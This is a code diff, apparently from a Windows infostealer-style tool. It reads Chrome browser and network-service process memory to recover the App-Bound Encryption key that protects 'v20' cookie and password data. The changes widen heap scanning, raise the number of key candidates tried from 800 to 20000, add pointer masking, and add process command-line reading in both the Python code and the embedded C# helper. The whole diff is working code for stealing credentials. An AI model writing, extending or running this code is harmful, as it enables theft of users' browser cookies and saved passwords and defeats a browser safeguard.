@@ -30,11 +30,12 @@ _DUP_HANDLE_TIMEOUT_S = 10.0
 _DUP_HANDLE_MAX_PIDS = 24
 _DUP_HANDLE_MAX_HANDLES = 4000
 _ABE_COCREATE_TIMEOUT_S = 2.0
-_ABE_HELPER_TIMEOUT_S = 6.0
-_ABE_MEMSCAN_TIMEOUT_S = 5.0
+_ABE_HELPER_TIMEOUT_S = 8.0
+_ABE_MEMSCAN_TIMEOUT_S = 6.0
 _ABE_MEMSCAN_MAX_BYTES = 256 << 20
-_ABE_MEMSCAN_MAX_CAND = 800
+_ABE_MEMSCAN_MAX_CAND = 20000
 _ABE_MEMSCAN_MAX_REGION = 32 << 20
+_ABE_PTR_MASK = 0x00007FFFFFFFFFF8
 _DUP_SQLITE_PEEK_MAX = 64
 _SQLITE_MAGIC = b"SQLite format 3\x00"
 _SYSTEM_HANDLE_BUF_MAX = 8 << 20
@@ -3278,8 +3279,13 @@ def _chrome_pid_score(command_line: str) -> int:
     return 5
 
 
+def _chrome_abe_cmd_ok(command_line: str) -> bool:
+    """Browser (no --type=) or network utility only. Never renderer/gpu heaps."""
+    return _chrome_pid_score(command_line) <= 1
+
+
 def _chrome_pids_prioritized() -> list[int]:
-    """Network service + browser first. Skip stuffing renderer heaps."""
+    """Network service + browser only. Never return renderer PIDs."""
     scored: list[tuple[int, int]] = []
     try:
         ps = _windows_powershell()
@@ -3301,69 +3307,113 @@ def _chrome_pids_prioritized() -> list[int]:
                 scored.append((_chrome_pid_score(cmd), int(pid_s)))
     except (OSError, subprocess.SubprocessError):
         scored = []
-    if not scored:
-        return _chrome_pids()
-    scored.sort(key=lambda row: (row[0], row[1]))
-    return [pid for _score, pid in scored]
+    keep = [pid for score, pid in sorted(scored) if score <= 1]
+    return keep
+
+
+def _canonical_ptr(addr: int) -> int:
+    return int(addr) & _ABE_PTR_MASK
 
 
 def _looks_like_user_ptr(addr: int) -> bool:
-    return 0x10000 <= addr < 0x00007FFFFFFEFFFF
+    return 0x10000 <= _canonical_ptr(addr) < 0x00007FFFFFFEFFFF
 
 
 def _high_entropy32(buf: bytes) -> bool:
     return len(buf) == 32 and len(set(buf)) >= 12
 
 
-def _extract_abe_candidate_ptrs(buf: bytes) -> list[int]:
-    """x64 std::vector / std::string / ptr+size=32. Not inline after a 4-byte 0x20."""
-    addrs: list[int] = []
+def _extract_abe_candidate_ptrs(buf: bytes) -> list[tuple[int, int]]:
+    """(addr, nbytes) for x64 vector/string/HeapArray. MiraclePtr-masked."""
+    found: dict[int, int] = {}
     n = len(buf)
-    if n < 24:
-        return addrs
-    for i in range(0, n - 23, 8):
+    if n < 16:
+        return []
+    for i in range(0, n - 15, 8):
         start = int.from_bytes(buf[i : i + 8], "little")
         finish = int.from_bytes(buf[i + 8 : i + 16], "little")
-        eos = int.from_bytes(buf[i + 16 : i + 24], "little")
-        if (
-            finish == start + 32
-            and eos >= finish
-            and eos - start <= 0x10000
-            and _looks_like_user_ptr(start)
-        ):
-            addrs.append(start)
+        if not _looks_like_user_ptr(start):
+            continue
+        raw_start = _canonical_ptr(start)
+        if n >= i + 24:
+            eos = int.from_bytes(buf[i + 16 : i + 24], "little")
+            span = finish - start
+            if 32 <= span <= 512 and eos >= finish and (eos - start) <= 0x10000:
+                found[raw_start] = int(span)
+        if finish == 32:
+            found[raw_start] = 32
     for i in range(8, n - 15, 8):
         size = int.from_bytes(buf[i : i + 8], "little")
         cap = int.from_bytes(buf[i + 8 : i + 16], "little")
         if size == 32 and 32 <= cap <= 0x10000:
             ptr = int.from_bytes(buf[i - 8 : i], "little")
             if _looks_like_user_ptr(ptr):
-                addrs.append(ptr)
-    return addrs
+                found[_canonical_ptr(ptr)] = 32
+    return list(found.items())
 
 
 def _inline_bstr_keys(buf: bytes) -> list[bytes]:
-    """COM BSTR leftover: 4-byte length 32 + high-entropy key. Skip std::string sizes."""
+    """DWORD/size_t length 32 + high-entropy key, including bytes after size_t 32."""
     out: list[bytes] = []
-    prefix = b"\x20\x00\x00\x00"
+    prefix4 = b"\x20\x00\x00\x00"
+    prefix8 = b"\x20\x00\x00\x00\x00\x00\x00\x00"
     start = 0
     while True:
-        idx = buf.find(prefix, start)
+        idx = buf.find(prefix8, start)
+        if idx < 0 or idx + 40 > len(buf):
+            break
+        cand = buf[idx + 8 : idx + 40]
+        start = idx + 1
+        if _high_entropy32(cand):
+            out.append(cand)
+    start = 0
+    while True:
+        idx = buf.find(prefix4, start)
         if idx < 0 or idx + 36 > len(buf):
             break
-        # x64 size_t 32 is 20 00 00 00 00 00 00 00 — that is not a BSTR key.
+        start = idx + 1
         if idx + 8 <= len(buf) and buf[idx + 4 : idx + 8] == b"\x00\x00\x00\x00":
-            start = idx + 1
             continue
         cand = buf[idx + 4 : idx + 36]
-        start = idx + 1
+        if _high_entropy32(cand):
+            out.append(cand)
+    return out
+
+
+def _keys_from_key_blob(blob: bytes) -> list[bytes]:
+    """First/last 32 and elevator [len][data][len=32][key]."""
+    out: list[bytes] = []
+    if len(blob) >= 32:
+        if _high_entropy32(blob[:32]):
+            out.append(blob[:32])
+        if _high_entropy32(blob[-32:]):
+            out.append(blob[-32:])
+    if len(blob) >= 8:
+        n = int.from_bytes(blob[:4], "little")
+        if 0 < n < 4096 and 4 + n + 4 + 32 <= len(blob):
+            n2 = int.from_bytes(blob[4 + n : 8 + n], "little")
+            if n2 == 32:
+                cand = blob[8 + n : 40 + n]
+                if _high_entropy32(cand):
+                    out.append(cand)
+    return out
+
+
+def _aligned_entropy_keys(buf: bytes) -> list[bytes]:
+    """std::array<uint8_t,32> / key_[32] in small heaps."""
+    out: list[bytes] = []
+    n = len(buf)
+    if n < 32:
+        return out
+    for i in range(0, n - 31, 8):
+        cand = buf[i : i + 32]
         if _high_entropy32(cand):
             out.append(cand)
     return out
 
 
 def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
-    """Follow 32-byte vector/string pointers in chrome heaps; verify a v20 blob."""
+    """Browser/network only. Follow Chrome 151 key layouts; verify a v20 blob."""
     if os.name != "nt":
         return None, "memscan:not_nt"
     if not _valid_v20_sample(v20_sample):
@@ -3375,7 +3425,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None, "memscan:no_ctypes"
     pids = _chrome_pids_prioritized()
     if not pids:
-        return None, "memscan:no_chrome"
+        return None, "memscan:no_browser"
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
     kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     kernel32.OpenProcess.restype = wintypes.HANDLE
@@ -3410,14 +3460,14 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     ]
     kernel32.VirtualQueryEx.restype = ctypes.c_size_t
 
-    def read32(handle: Any, addr: int) -> bytes | None:
-        buf = (ctypes.c_char * 32)()
+    def readn(handle: Any, addr: int, n: int) -> bytes | None:
+        buf = (ctypes.c_char * n)()
         got = ctypes.c_size_t(0)
         if not kernel32.ReadProcessMemory(
-            handle, ctypes.c_void_p(addr), buf, 32, ctypes.byref(got)
+            handle, ctypes.c_void_p(addr), buf, n, ctypes.byref(got)
         ):
             return None
-        if int(got.value) != 32:
+        if int(got.value) != n:
             return None
         return bytes(buf)
 
@@ -3431,9 +3481,22 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     PROCESS_QUERY_LIMITED = 0x1000
     MEM_COMMIT = 0x1000
     MEM_PRIVATE = 0x20000
+    MEM_MAPPED = 0x40000
+    MEM_IMAGE = 0x1000000
     PAGE_GUARD = 0x100
-    allowed_prot = {0x04, 0x40}
+    allowed_prot = {0x02, 0x04, 0x08, 0x40}
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
+
+    def consider(cand: bytes | None) -> bytes | None:
+        nonlocal tried
+        if not cand or cand in seen or not _high_entropy32(cand):
+            return None
+        seen.add(cand)
+        tried += 1
+        if _v20_key_ok(cand, v20_sample):
+            return cand
+        return None
+
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
@@ -3464,9 +3527,13 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                 if size <= 0:
                     break
                 prot = int(mbi.Protect)
+                mtype = int(mbi.Type)
+                type_ok = mtype in {MEM_PRIVATE, MEM_MAPPED} or (
+                    mtype == MEM_IMAGE and (prot & 0xFF) in {0x04, 0x08}
+                )
                 usable = (
                     int(mbi.State) == MEM_COMMIT
-                    and int(mbi.Type) == MEM_PRIVATE
+                    and type_ok
                     and (prot & PAGE_GUARD) == 0
                     and (prot & 0xFF) in allowed_prot
                     and size <= _ABE_MEMSCAN_MAX_REGION
@@ -3477,28 +3544,30 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     got = ctypes.c_size_t(0)
                     if kernel32.ReadProcessMemory(
                         handle, ctypes.c_void_p(int(mbi.BaseAddress)), raw, n, ctypes.byref(got)
-                    ) and int(got.value) >= 24:
+                    ) and int(got.value) >= 16:
                         data = bytes(raw[: int(got.value)])
                         scanned += len(data)
-                        for ptr in _extract_abe_candidate_ptrs(data):
+                        for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            cand = read32(handle, ptr)
-                            if not cand or cand in seen or not _high_entropy32(cand):
+                            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
+                            if not blob:
                                 continue
-                            seen.add(cand)
-                            tried += 1
-                            if _v20_key_ok(cand, v20_sample):
-                                return cand, "ok"
+                            for cand in _keys_from_key_blob(blob):
+                                hit = consider(cand)
+                                if hit:
+                                    return hit, "ok"
                         for cand in _inline_bstr_keys(data):
-                            if tried >= _ABE_MEMSCAN_MAX_CAND:
-                                break
-                            if cand in seen:
-                                continue
-                            seen.add(cand)
-                            tried += 1
-                            if _v20_key_ok(cand, v20_sample):
-                                return cand, "ok"
+                            hit = consider(cand)
+                            if hit:
+                                return hit, "ok"
+                        if mtype == MEM_PRIVATE and size <= 2 << 20:
+                            for cand in _aligned_entropy_keys(data):
+                                if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                    break
+                                hit = consider(cand)
+                                if hit:
+                                    return hit, "ok"
                 nxt = addr + size
                 if nxt <= addr:
                     break
@@ -3509,7 +3578,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None, "memscan:OpenProcess"
     if tried == 0:
         return None, "memscan:no_cand"
-    return None, "memscan:no_key"
+    return None, f"memscan:no_key:{tried}"
 
 
 def _find_csc() -> Path | None:
@@ -3685,6 +3754,8 @@ class K {
   static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, int len);
   [DllImport("kernel32.dll", SetLastError=true)]
   static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int n, out int read);
+  [DllImport("ntdll.dll")]
+  static extern int NtQueryInformationProcess(IntPtr h, int cls, IntPtr buf, int len, out int ret);
 
   [DllImport("bcrypt.dll")]
   static extern int BCryptOpenAlgorithmProvider(out IntPtr ph, [MarshalAs(UnmanagedType.LPWStr)] string alg, [MarshalAs(UnmanagedType.LPWStr)] string impl, uint flags);
@@ -3731,10 +3802,13 @@ class K {
   const uint PROCESS_QUERY_LIMITED = 0x1000;
   const uint MEM_COMMIT = 0x1000;
   const uint MEM_PRIVATE = 0x20000;
+  const uint MEM_MAPPED = 0x40000;
+  const uint MEM_IMAGE = 0x1000000;
   const uint PAGE_GUARD = 0x100;
-  const int MAX_CAND = 800;
+  const int MAX_CAND = 20000;
   const int MAX_REGION = 32 * 1024 * 1024;
   const int MAX_BYTES = 256 * 1024 * 1024;
+  const ulong PTR_MASK = 0x00007FFFFFFFFFF8UL;
 
   static IntPtr hAlgGlobal = IntPtr.Zero;
   static byte[] sampleNonce;
@@ -3756,8 +3830,47 @@ class K {
     return n >= 12;
   }
 
+  static ulong Canon(ulong p) { return p & PTR_MASK; }
+
   static bool UserPtr(ulong p) {
-    return p >= 0x10000UL && p < 0x00007FFFFFFEFFFFUL;
+    ulong a = Canon(p);
+    return a >= 0x10000UL && a < 0x00007FFFFFFEFFFFUL;
+  }
+
+  [StructLayout(LayoutKind.Sequential)]
+  struct UNICODE_STRING {
+    public ushort Length;
+    public ushort MaximumLength;
+    public IntPtr Buffer;
+  }
+
+  static string CmdLine(int pid) {
+    IntPtr h = OpenProcess(PROCESS_QUERY_LIMITED | PROCESS_VM_READ, false, pid);
+    if (h == IntPtr.Zero) h = OpenProcess(PROCESS_QUERY_LIMITED, false, pid);
+    if (h == IntPtr.Zero) return "";
+    try {
+      int ret;
+      NtQueryInformationProcess(h, 60, IntPtr.Zero, 0, out ret);
+      if (ret <= 0 || ret > 32768) return "";
+      IntPtr buf = Marshal.AllocHGlobal(ret);
+      try {
+        if (NtQueryInformationProcess(h, 60, buf, ret, out ret) != 0) return "";
+        var us = (UNICODE_STRING)Marshal.PtrToStructure(buf, typeof(UNICODE_STRING));
+        if (us.Buffer == IntPtr.Zero || us.Length == 0) return "";
+        return Marshal.PtrToStringUni(us.Buffer, us.Length / 2) ?? "";
+      } finally { Marshal.FreeHGlobal(buf); }
+    } catch { return ""; }
+    finally { CloseHandle(h); }
+  }
+
+  static bool AbePid(int pid) {
+    string cmd = CmdLine(pid);
+    if (string.IsNullOrEmpty(cmd)) return false;
+    string c = cmd.ToLowerInvariant();
+    if (c.Contains("network.mojom.networkservice") || c.Contains("service-sandbox-type=network"))
+      return true;
+    if (c.Contains("--type=")) return false;
+    return true;
   }
 
   static bool InitAes(byte[] sample) {
@@ -3812,10 +3925,10 @@ class K {
     Environment.Exit(0);
   }
 
-  static byte[] Read32(IntPtr h, ulong addr) {
-    byte[] key = new byte[32];
+  static byte[] ReadN(IntPtr h, ulong addr, int n) {
+    byte[] key = new byte[n];
     int read;
-    if (!ReadProcessMemory(h, new IntPtr((long)addr), key, 32, out read) || read != 32) return null;
+    if (!ReadProcessMemory(h, new IntPtr((long)Canon(addr)), key, n, out read) || read != n) return null;
     return key;
   }
 
@@ -3825,6 +3938,24 @@ class K {
     if (!seen.Add(hex)) return;
     found.Add(key);
     if (AesGcmOk(key)) Win(key);
+  }
+
+  static void TryBlob(byte[] blob, List<byte[]> found, HashSet<string> seen) {
+    if (blob == null || blob.Length < 32) return;
+    byte[] first = new byte[32];
+    byte[] last = new byte[32];
+    Buffer.BlockCopy(blob, 0, first, 0, 32);
+    Buffer.BlockCopy(blob, blob.Length - 32, last, 0, 32);
+    TryKey(first, found, seen);
+    TryKey(last, found, seen);
+    if (blob.Length >= 8) {
+      int n = BitConverter.ToInt32(blob, 0);
+      if (n > 0 && n < 4096 && 4 + n + 4 + 32 <= blob.Length && BitConverter.ToInt32(blob, 4 + n) == 32) {
+        byte[] key = new byte[32];
+        Buffer.BlockCopy(blob, 8 + n, key, 0, 32);
+        TryKey(key, found, seen);
+      }
+    }
   }
 
   static void ScanPid(int pid, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline) {
@@ -3842,38 +3973,58 @@ class K {
         long size = (long)mbi.RegionSize;
         if (size <= 0) break;
         uint prot = mbi.Protect;
+        uint mtype = mbi.Type;
+        bool typeOk = mtype == MEM_PRIVATE || mtype == MEM_MAPPED
+          || (mtype == MEM_IMAGE && ((prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x08));
         bool ok = mbi.State == MEM_COMMIT
-          && mbi.Type == MEM_PRIVATE
+          && typeOk
           && (prot & PAGE_GUARD) == 0
-          && ((prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x40)
+          && ((prot & 0xFFu) == 0x02 || (prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x08 || (prot & 0xFFu) == 0x40)
           && size <= MAX_REGION;
         if (ok) {
           int n = (int)size;
           byte[] buf = new byte[n];
           int read;
-          if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 24) {
+          if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 16) {
             scanned += read;
-            for (int i = 0; i + 24 <= read && found.Count < MAX_CAND; i += 8) {
+            for (int i = 0; i + 16 <= read && found.Count < MAX_CAND; i += 8) {
               ulong start = BitConverter.ToUInt64(buf, i);
               ulong finish = BitConverter.ToUInt64(buf, i + 8);
-              ulong eos = BitConverter.ToUInt64(buf, i + 16);
-              if (finish == start + 32 && eos >= finish && eos - start <= 0x10000UL && UserPtr(start))
-                TryKey(Read32(h, start), found, seen);
+              if (!UserPtr(start)) continue;
+              if (i + 24 <= read) {
+                ulong eos = BitConverter.ToUInt64(buf, i + 16);
+                ulong span = finish - start;
+                if (span >= 32 && span <= 512 && eos >= finish && eos - start <= 0x10000UL)
+                  TryBlob(ReadN(h, start, (int)span), found, seen);
+              }
+              if (finish == 32)
+                TryKey(ReadN(h, start, 32), found, seen);
               if (i >= 8) {
-                ulong sz = start;
-                ulong cap = finish;
+                ulong sz = BitConverter.ToUInt64(buf, i);
+                ulong cap = BitConverter.ToUInt64(buf, i + 8);
                 if (sz == 32 && cap >= 32 && cap <= 0x10000UL) {
                   ulong ptr = BitConverter.ToUInt64(buf, i - 8);
-                  if (UserPtr(ptr)) TryKey(Read32(h, ptr), found, seen);
+                  if (UserPtr(ptr)) TryKey(ReadN(h, ptr, 32), found, seen);
                 }
               }
             }
-            for (int i = 0; i + 36 <= read && found.Count < MAX_CAND; i++) {
-              if (buf[i] == 0x20 && buf[i+1] == 0 && buf[i+2] == 0 && buf[i+3] == 0) {
-                if (i + 8 <= read && buf[i+4] == 0 && buf[i+5] == 0 && buf[i+6] == 0 && buf[i+7] == 0)
-                  continue;
+            for (int i = 0; i + 40 <= read && found.Count < MAX_CAND; i++) {
+              if (buf[i] == 0x20 && buf[i+1] == 0 && buf[i+2] == 0 && buf[i+3] == 0
+                  && buf[i+4] == 0 && buf[i+5] == 0 && buf[i+6] == 0 && buf[i+7] == 0) {
+                byte[] key = new byte[32];
+                Buffer.BlockCopy(buf, i+8, key, 0, 32);
+                TryKey(key, found, seen);
+              } else if (buf[i] == 0x20 && buf[i+1] == 0 && buf[i+2] == 0 && buf[i+3] == 0
+                  && !(i + 8 <= read && buf[i+4] == 0 && buf[i+5] == 0 && buf[i+6] == 0 && buf[i+7] == 0)) {
                 byte[] key = new byte[32];
                 Buffer.BlockCopy(buf, i+4, key, 0, 32);
+                TryKey(key, found, seen);
+              }
+            }
+            if (mtype == MEM_PRIVATE && size <= 2 * 1024 * 1024) {
+              for (int i = 0; i + 32 <= read && found.Count < MAX_CAND; i += 8) {
+                byte[] key = new byte[32];
+                Buffer.BlockCopy(buf, i, key, 0, 32);
                 TryKey(key, found, seen);
               }
             }
@@ -3892,13 +4043,15 @@ class K {
     if (!string.IsNullOrEmpty(env)) {
       foreach (var part in env.Split(',')) {
         int pid;
-        if (int.TryParse(part.Trim(), out pid) && pid > 0) list.Add(pid);
+        if (int.TryParse(part.Trim(), out pid) && pid > 0 && AbePid(pid)) list.Add(pid);
       }
       if (list.Count > 0) return list;
     }
     try {
       foreach (var p in Process.GetProcessesByName("chrome")) {
-        try { list.Add(p.Id); } catch {}
+        try {
+          if (AbePid(p.Id)) list.Add(p.Id);
+        } catch {}
       }
     } catch {}
     return list;
@@ -3917,7 +4070,7 @@ class K {
     }
     if (!InitAes(sample)) { FailHr("memscan:aes"); return 6; }
     var pids = Pids();
-    if (pids.Count == 0) { FailHr("memscan:no_chrome"); return 3; }
+    if (pids.Count == 0) { FailHr("memscan:no_browser"); return 3; }
     var found = new List<byte[]>();
     var seen = new HashSet<string>();
     int scanned = 0;
